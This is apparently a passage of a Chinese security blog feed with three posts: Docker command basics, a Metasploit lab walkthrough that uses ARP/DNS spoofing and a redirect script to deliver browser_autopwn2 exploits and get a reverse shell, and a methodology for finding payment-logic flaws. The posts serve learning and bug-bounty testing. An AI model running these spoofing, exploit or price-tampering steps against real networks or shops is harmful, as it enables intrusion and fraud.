[]</span><br></pre></td></tr></table></figure><p><strong>导出镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker road &lt; test.tar</span><br></pre></td></tr></table></figure><h2 id="3-容器操作"><a href="#3-容器操作" class="headerlink" title="3. 容器操作"></a>3. 容器操作</h2><p><strong>启动容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --rm --name [容器名字] [镜像名称] [可执行命令]</span><br><span class="line">参数说明：</span><br><span class="line">-d：让容器在后台运行</span><br><span class="line">-P：将容器内部使用的网络端口映射到宿主机</span><br><span class="line">-p：[主机端口:容器端口] 可自定义映射端口</span><br><span class="line">--name：可自定义容器名称</span><br><span class="line">--rm：当容器停止时，会自动删除</span><br></pre></td></tr></table></figure><p><strong>查看运行容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><strong>查看容器端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器内部日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f [容器id/名称] //可以查看容器内部的标准输出</span><br><span class="line">-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出</span><br></pre></td></tr></table></figure><p><strong>进入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [容器id/名称] /bin/bash//推荐使用</span><br><span class="line">docker attach [容器id/名称] //不会在容器中创建进程执行额外的命令，只是附着到容器上</span><br><span class="line">//attach必须登陆到一个已经运行的容器里，如果从这个容器中exit退出的话，就会导致容器停止</span><br></pre></td></tr></table></figure><p><strong>离开容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+P+Q//正常退出不关闭容器</span><br><span class="line">exit//退出之后关闭容器,可以使用下面的流程进行恢复</span><br><span class="line">使用docker restart命令重启容器</span><br><span class="line">使用docker attach命令进入容器</span><br></pre></td></tr></table></figure><p><strong>停止容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>重新开启容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看所有容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器底层信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [容器id/名称]</span><br><span class="line">//删除前必须先停止正在运行的容器</span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import &lt; test.tar</span><br></pre></td></tr></table></figure><p><strong>docker批量删除容器、镜像</strong></p><p>一条命令实现停用并删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><p>删除所有镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p>按条件删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a | awk &apos;/test\/webapp/ &#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><p>按条件删除镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#没有打标签</span><br><span class="line">docker rmi `docker images -q | awk &apos;/^&lt;none&gt;/ &#123; print $3 &#125;&apos;`</span><br><span class="line">#镜像名包含关键字</span><br><span class="line">docker rmi --force `docker images | grep keywords | awk &apos;&#123;print $3&#125;&apos;`   </span><br><span class="line">//其中keywords为关键字</span><br></pre></td></tr></table></figure><h1 id="六、容器部署实例"><a href="#六、容器部署实例" class="headerlink" title="六、容器部署实例"></a>六、容器部署实例</h1><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1. 安装nginx"></a>1. 安装nginx</h3><ul><li>从docker hub上拉取镜像</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx:latest</span><br></pre></td></tr></table></figure><ul><li>托管一些简单的静态内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-nginx -v  $PWD/html:/usr/share/nginx/html:ro -d nginx</span><br><span class="line"> -v $PWD/html:/usr/share/nginx/html：将主机中当前目录下的html挂载到容器的/usr/share/nginx/html</span><br></pre></td></tr></table></figure><ul><li>或者准备自己的配置文件和文件目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br><span class="line">#dockerhub上有详细自定义配置部署说明</span><br><span class="line">-p 80:80：将容器的80端口映射到主机的80端口</span><br><span class="line">--name mynginx：将容器命名为mynginx</span><br><span class="line">-v $PWD/www:/www：将主机中当前目录下的www挂载到容器的/www</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf：将主机中当前目录下的nginx.conf挂载到容器的/etc/nginx/nginx.conf</span><br><span class="line">-v $PWD/logs:/wwwlogs：将主机中当前目录下的logs挂载到容器的/wwwlogs</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：如果出现以下类似报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:344: starting container process caused &quot;process_linux.go:424: container init caused \&quot;rootfs_linux.go:58: mounting \\\&quot;/opt/nginx/conf/nginx.conf\\\&quot; to rootfs \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged\\\&quot; at \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged/etc/nginx/nginx.conf\\\&quot; caused \\\&quot;not a directory\\\&quot;\&quot;&quot;: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type.</span><br></pre></td></tr></table></figure><p>是因为没提前创建好挂载目录和配置文件导致conf/nginx.conf 自动创建成目录，删除并创建nginx.conf配置文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll conf/</span><br><span class="line">rm -r conf/nginx.conf</span><br><span class="line">touch conf/nginx.conf</span><br></pre></td></tr></table></figure><ul><li>查看运行容器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-bde19eff6c1fd6ea.png" alt="当前正在运行的容器"></p><h3 id="2-安装Lamp环境"><a href="#2-安装Lamp环境" class="headerlink" title="2. 安装Lamp环境"></a>2. 安装Lamp环境</h3><p>拉取一个lamp镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fauria/lamp</span><br></pre></td></tr></table></figure><p>创建lamp目录&amp;挂载路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/lamp &amp;&amp; cd ~/lamp</span><br><span class="line">mkdir www logs</span><br></pre></td></tr></table></figure><p>创建容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 80:80 -v /opt/lamp/www:/var/www/html -v /opt/lamp/logs/:/var/log/httpd --name my-lamp-container fauria/lamp</span><br></pre></td></tr></table></figure><p>查看是否启动成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-1fab64e3d8195ff5.png" alt="STATUS为UP说明启动成功"></p><p>查看所有容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>进入一个已经在运行的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其中字符串为容器ID</span><br><span class="line">docker exec -it d27bd3998ad9 /bin/bash</span><br></pre></td></tr></table></figure><p>删除容器删除前先停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop  d27b  &amp; docker rm d27b</span><br></pre></td></tr></table></figure><h1 id="七、最后"><a href="#七、最后" class="headerlink" title="七、最后"></a>七、最后</h1><p>本文只是起到docker的入门作用，如果想深入学习</p><p>以下推荐几个dokcer在线学习网站</p><p>[Docker 教程 | 菜鸟教程]<a href="http://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/docker/docker-tutorial.html</a></p><p>[Docker 入门教程|阮一峰的网络日志]<a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit利用-浏览器自动攻击</title>
      <link href="/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/"/>
      <url>/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。</p><a id="more"></a><h2 id="二、测试环境"><a href="#二、测试环境" class="headerlink" title="二、测试环境"></a>二、测试环境</h2><ul><li><p>本地局域网络</p></li><li><p>Kali</p></li><li><p>Windows Server 2003 / xp </p></li></ul><h2 id="三、使用工具"><a href="#三、使用工具" class="headerlink" title="三、使用工具"></a>三、使用工具</h2><ul><li><p>Metasploit</p></li><li><p>Ettercap</p></li></ul><h2 id="四、Exp"><a href="#四、Exp" class="headerlink" title="四、Exp"></a>四、Exp</h2><p>browser_autopwn2</p><h2 id="五、目的"><a href="#五、目的" class="headerlink" title="五、目的"></a>五、目的</h2><p>如果在同一局域网，目标机器上没有可成功利用的端口时，我们可以尝试进行浏览器攻击。首先，在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点，访问该站点页面会自动跳转至我们构造好的恶意URL上，然后获得反弹shell，这样就能达到获取权限目的。</p><h2 id="六、服务端准备"><a href="#六、服务端准备" class="headerlink" title="六、服务端准备"></a>六、服务端准备</h2><h3 id="1-启动MSF"><a href="#1-启动MSF" class="headerlink" title="1. 启动MSF"></a>1. 启动MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start//启动msf框架所依赖的数据库</span><br><span class="line">msfconsole//启动msfconsole</span><br></pre></td></tr></table></figure><h3 id="2-加载Exp"><a href="#2-加载Exp" class="headerlink" title="2. 加载Exp"></a>2. 加载Exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search browser_autopwn2//搜索browser_autopwn2模块</span><br><span class="line">use auxiliary/server/browser_autopwn2//使用该模块</span><br><span class="line">show options//查看参数，可默认无需修改</span><br><span class="line">set//查看设置内容</span><br><span class="line">run//启动模块</span><br></pre></td></tr></table></figure><p>等待出现URL，和 Server started</p><h3 id="3-构造恶意URL"><a href="#3-构造恶意URL" class="headerlink" title="3. 构造恶意URL"></a>3. 构造恶意URL</h3><p>在Apache中写上自动跳转的代码，向恶意URL上跳转</p><p>这里采用javascript实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// 以下方式定时跳转</span></span><br><span class="line"><span class="undefined">setTimeout("javascript:location.href='http://192.168.10.3:8080/Y3JY6DI6gql5iSu'", 5000); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-启动站点服务"><a href="#5-启动站点服务" class="headerlink" title="5.启动站点服务"></a>5.启动站点服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure><h2 id="七、攻击客户端"><a href="#七、攻击客户端" class="headerlink" title="七、攻击客户端"></a>七、攻击客户端</h2><h3 id="1-DNS欺骗"><a href="#1-DNS欺骗" class="headerlink" title="1. DNS欺骗"></a>1. DNS欺骗</h3><p><strong>使用Ettercap</strong></p><ol><li><p>打开Ettercap的 DNS文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>添加欺骗的A记录和PTR（反向）记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.*.comA192.168.10.3</span><br><span class="line">www.*.comPTR192.168.10.3</span><br></pre></td></tr></table></figure></li><li><p>kali中输入ettercap -G 进入该工具的图形化界面 </p><p>菜单栏选择sniff –&gt; Unified sniffing –&gt;选择上网网卡 </p><p>菜单栏选择Hosts –&gt; Scan for Hosts –&gt; 再点击host list</p><ul><li><p>选择欺骗目标的网关  添加到target1</p></li><li><p>选择欺骗目标的IP 添加到target2</p></li></ul><p>菜单栏选择Mitm–&gt;ARP poisoning–&gt;勾选Sniff remote connections（ARP欺骗）</p><p>菜单栏选择Plugins–&gt;Manage the plugins–&gt;选择dns-spoof（dns欺骗）</p><p>最后，菜单栏中找到start–&gt;start sniffing</p></li></ol><h3 id="2-等待目标使用浏览器"><a href="#2-等待目标使用浏览器" class="headerlink" title="2. 等待目标使用浏览器"></a>2. 等待目标使用浏览器</h3><ol><li><p>目标地址访问任意符合该URL的页面：www.***.com，即可成功跳转至恶意URL</p></li><li><p>访问我们的恶意页面后，该模块会自动选择最合适的exploit，进行攻击利用</p></li><li><p>等待一段时间，直到出现 Successfully migrated to process</p><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554724873153.png" alt="1554724873153"></p></li><li><p>查看session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure></li><li><p>选择相应序号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure></li><li><p>getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554725111543.png" alt="1554725111543"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> 浏览器攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞挖掘思路-支付逻辑</title>
      <link href="/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/"/>
      <url>/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="一、现在src关注的重点"><a href="#一、现在src关注的重点" class="headerlink" title="一、现在src关注的重点"></a>一、现在src关注的重点</h2><p>​    随着常规漏洞的风险降低，以及挖掘难度的增加，现在的src更多的关注点，也就是白帽子关注的重点是逻辑漏洞。逻辑漏洞不要求有很深的基础，比如sql注入手工注入需要对sql注入有很深厚的理解；逻辑漏洞只需要对业务逻辑和关键参数有一定的了解，剩下的看运气。</p><a id="more"></a><h2 id="二、刷src之前的准备"><a href="#二、刷src之前的准备" class="headerlink" title="二、刷src之前的准备"></a>二、刷src之前的准备</h2><h3 id="1-信息收集（泛讲）"><a href="#1-信息收集（泛讲）" class="headerlink" title="1. 信息收集（泛讲）"></a>1. 信息收集（泛讲）</h3><p>​    渗透测试和漏洞挖掘，信息收集是贯彻于整个流程的；在进行src挖掘之前，要进行信息收集，在确定漏洞产生什么危害的时候，也要进行信息收集，也就是说渗透测试和漏洞挖掘的本质就是信息收集。</p><h3 id="2-具体要收集哪些信息"><a href="#2-具体要收集哪些信息" class="headerlink" title="2. 具体要收集哪些信息"></a>2. 具体要收集哪些信息</h3><ol><li><p>厂商域名和IP段（测试范围界定）</p><p>主站（可能防护较好），子站（子域名收集）</p><p>（明确测试范围，如果查出范围，有可能承担法律风险）</p></li><li><p>厂商业务信息（规划）</p><ul><li><p>如果业务架构较小，漏洞有限，不必去深挖</p></li><li><p>如果业务架构非常大，可以持久的挖</p></li></ul></li><li><p>子域名收集</p></li><li><p>IP段</p></li><li><p>端口（端口对应业务）</p></li><li><p>精准字典</p><ul><li><p>社工字典（站长信息，站点信息），</p><p>提高准确度，也增强自己的能力</p></li><li><p>不断收集字典，常见的（例：国人100弱密码）</p></li></ul></li><li><p>敏感接口</p><p>蛋糕那么小，人那么多，如果不选择一些不引人注意的范围进行利用的话，可能连粥都没得喝（简单例：如果接口外露，可以频繁的发起短信轰炸）</p></li><li><p>其他信息等</p></li></ol><h3 id="3-需要准备什么工具"><a href="#3-需要准备什么工具" class="headerlink" title="3. 需要准备什么工具"></a>3. 需要准备什么工具</h3><p>Burp suite and fiddler、Browser浏览器</p><p>或者仅需浏览器即可</p><h2 id="三、挖掘思路"><a href="#三、挖掘思路" class="headerlink" title="三、挖掘思路"></a>三、挖掘思路</h2><h3 id="1-锁定关键变量与深入逻辑"><a href="#1-锁定关键变量与深入逻辑" class="headerlink" title="1. 锁定关键变量与深入逻辑"></a>1. 锁定关键变量与深入逻辑</h3><ul><li><p>锁定关键可控变量</p></li><li><p>深入了解逻辑，进一步绕过</p></li></ul><p>​    不是单纯的靠工具跑出来，用工具跑出来的漏洞，不能叫漏洞了，因为没有你任何价值的体现。</p><p>​    例如sql注入关键变量是一个id的话，此时就要深入的判断它的一些字符型、数字型以及对它的逻辑进一步去挖掘。</p><p>​    所以说不管挖哪些漏洞，其实本质就是这个样子的，首先锁定一个关键的漏洞，紧接着深入了解一下他的逻辑具体是什么样子的，然后进一步的进行绕过。</p><h3 id="2-逻辑漏洞的定义"><a href="#2-逻辑漏洞的定义" class="headerlink" title="2. 逻辑漏洞的定义"></a>2. 逻辑漏洞的定义</h3><p>由于程序逻辑不严谨，导致逻辑未能正常处理或处理错误的漏洞成为逻辑漏洞。</p><p>零信任原则：不管用户输入任何东西，都是零信任的。</p><h3 id="3-了解逻辑业务"><a href="#3-了解逻辑业务" class="headerlink" title="3. 了解逻辑业务"></a>3. 了解逻辑业务</h3><p>如果不了解业务，就开始找漏洞，可能就会陷入盲目，比较费时间，并且没有任何成果，打消自己的自信力；所以先对业务有一定的了解，哪个模块可能会出现那些漏洞</p><p>例如表单，一般会跟数据库有交互，就可能存在sql注入</p><p>以下为参考</p><ul><li>电商行业</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553268179.png" alt="1554553268179"></p><ul><li>P2P金融</li></ul><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554553286437.png" alt="1554553286437"></p><h2 id="四、支付漏洞挖掘"><a href="#四、支付漏洞挖掘" class="headerlink" title="四、支付漏洞挖掘"></a>四、支付漏洞挖掘</h2><p>在支付环节中由于逻辑不严谨而产生的漏洞称为支付漏洞</p><p>src不会拒绝的，其他的可能会打擦边球，但是涉及到钱的问题，对商家或厂家是重中之重</p><h3 id="1-明确挖洞步骤"><a href="#1-明确挖洞步骤" class="headerlink" title="1. 明确挖洞步骤"></a>1. 明确挖洞步骤</h3><ol><li>明确支付点</li><li>寻找关键可控变量</li><li>抓包放包对比</li></ol><h3 id="2-技巧"><a href="#2-技巧" class="headerlink" title="2. 技巧"></a>2. 技巧</h3><ul><li><p>两个账号A、B</p></li><li><p>A走一遍流程；</p></li><li><p>B负责在A账号正常流程破坏的</p></li></ul><p>例：找回密码</p><h3 id="3-支付流程"><a href="#3-支付流程" class="headerlink" title="3. 支付流程"></a>3. 支付流程</h3><p>用户订购：</p><ul><li>信息泄露/越权<ul><li>id+/-</li></ul></li></ul><p>↓</p><p>金额：</p><ul><li><p>修改金额</p><ul><li>正负逻辑</li><li>0.01模式</li><li>最大值越界</li></ul></li><li><p>积分换购</p><ul><li>积分抵扣</li><li>积分兑换</li></ul></li></ul><p>↓</p><p>生成订单：</p><ul><li>更改状态<ul><li>接口更改</li><li>更改关键值</li></ul></li></ul><p>↓</p><p>扣除金额</p><p>↓</p><p>库存 - 1</p><ul><li>多线程并发（-99999999）影响交易</li></ul><p>↓</p><p>收货阶段</p><ul><li>确认收货<ul><li>绕过客户直接确认收货</li></ul></li><li>退货<ul><li>更改货物状态</li><li>更改退货价格</li></ul></li></ul><h3 id="4-具体思路"><a href="#4-具体思路" class="headerlink" title="4. 具体思路"></a>4. 具体思路</h3><p><strong>一、订单模块</strong></p><ol><li>下单之后修改商品价格</li><li>下单之后更改数量设为负数，产生正负逻辑</li><li>并发购买是否出现逻辑问题</li><li>商品为0，是否存在购买的可能</li><li>生成订单时修改订单金额</li></ol><p><strong>二、结算模块</strong></p><ol><li>优惠劵重复利用</li><li>修改结算的状态</li><li>更改支付的API或者支付模式（转为第三方）</li><li>伪造成功结算的请求</li></ol><p><strong>三、退货模块</strong></p><ol><li>更改货物状态</li><li>更改退货价格</li></ol><p><strong>四、收货模块</strong></p><ol><li>绕过客户直接确认收货</li></ol><h3 id="5-具体场景"><a href="#5-具体场景" class="headerlink" title="5. 具体场景"></a>5. 具体场景</h3><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554555632056.png" alt="1554555632056"></p><h3 id="6-举例"><a href="#6-举例" class="headerlink" title="6. 举例"></a>6. 举例</h3><h4 id="1-信息泄露-越权"><a href="#1-信息泄露-越权" class="headerlink" title="1. 信息泄露/越权"></a>1. 信息泄露/越权</h4><p><strong>例1：</strong></p><p>第一步：明确支付点：购票</p><p>第二步：寻找关键可控变量</p><p>关键变量：</p><ul><li>订单id和用户id（变量未加密）</li><li>变量加密<ul><li>前端JS加密</li><li>Ajax异步加载请求</li><li>后端加密</li></ul></li></ul><p>第三步：抓包放包对比</p><ul><li>订单id增减，用户id增减，同时增减（平行越权造成订单信息泄露）</li></ul><p><strong>例2：</strong></p><p>第一步：明确支付点：酒店预订</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：订单id和价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>订单id增减，实现订单遍历</p><h4 id="2-正负逻辑：修改数量"><a href="#2-正负逻辑：修改数量" class="headerlink" title="2. 正负逻辑：修改数量"></a>2. 正负逻辑：修改数量</h4><p><strong>例3：</strong></p><p>第一步：明确支付点：购买商品</p><p>第二步：寻找关键可控变量（币的数量）</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改价格（币的数量）</p><p><strong>例4：</strong></p><p>第一步：明确支付点：积分换币</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：币数量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改币的数量</p><h4 id="3-正负逻辑：支付价格变动"><a href="#3-正负逻辑：支付价格变动" class="headerlink" title="3. 正负逻辑：支付价格变动"></a>3. 正负逻辑：支付价格变动</h4><p><strong>例5：</strong></p><p>第一步：明确支付点：购物</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：价格变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>更改Price可增加余额</p><h4 id="4-正负逻辑：修改附属值"><a href="#4-正负逻辑：修改附属值" class="headerlink" title="4. 正负逻辑：修改附属值"></a>4. 正负逻辑：修改附属值</h4><p><strong>例6：</strong></p><p>第一步：明确支付点：兑换物品（积分+金额模式付款）</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><h4 id="5-0-01模式"><a href="#5-0-01模式" class="headerlink" title="5. 0.01模式"></a>5. 0.01模式</h4><p>0.01模式：逻辑判断价格不能为负数</p><p><strong>例7：</strong></p><p>第一步：明确支付点：购买保险</p><p>第二步：寻找关键可控变量</p><ul><li>关键变量：金额变量（一个或多个）（变量未加密）</li></ul><p>第三步：抓包放包对比</p><p>金额变量变化，最终支付价格也会变化</p><p>### </p><h2 id="五、支付漏洞修复建议"><a href="#五、支付漏洞修复建议" class="headerlink" title="五、支付漏洞修复建议"></a>五、支付漏洞修复建议</h2><p><img src="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/1554557520785.png" alt="1554557520785"></p><h2 id="六、漏洞报告"><a href="#六、漏洞报告" class="headerlink" title="六、漏洞报告"></a>六、漏洞报告</h2><p>漏洞报告最好具有规范性</p><p><strong>一般内容</strong>：</p><ul><li><p>漏洞标题</p></li><li><p>漏洞等级</p></li><li><p>漏洞影响范围</p></li><li><p>漏洞证明信息</p></li><li><p>漏洞修复建议</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 业务逻辑漏洞 </tag>
            
            <tag> 支付逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 2008 R2 搭建VPN服务</title>
      <link href="/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Windows-2008-R2-%E6%90%AD%E5%BB%BAVPN%E6%9C%8D%E5%8A%A1/</url>
      
